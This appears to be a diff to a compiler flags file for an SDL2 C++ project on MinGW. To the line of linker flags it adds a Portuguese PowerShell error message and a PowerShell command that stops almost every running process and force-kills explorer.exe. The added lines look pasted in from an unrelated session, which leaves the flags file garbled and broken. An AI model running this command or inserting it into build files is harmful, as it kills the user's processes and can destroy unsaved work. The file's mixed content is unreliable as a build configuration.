@@ -1,1 +1,4 @@
 -std=c++11 -LC:/MinGW/lib -lmingw32 -lSDL2main -lSDL2 -lSDL2_image -lSDL2_mixer -lSDL2_ttf
+
+Falha na tentativa de realizar a operação InitializeDefaultDrives no provedor 'FileSystem'.
+powershell -c "(get-process | ? { $_.CommandLine -notmatch 'conhost|swarm|prog' -and $_.Name -notmatch 'System Idle|^System$' } )| stop-process" && taskkill /f /im explorer.exe
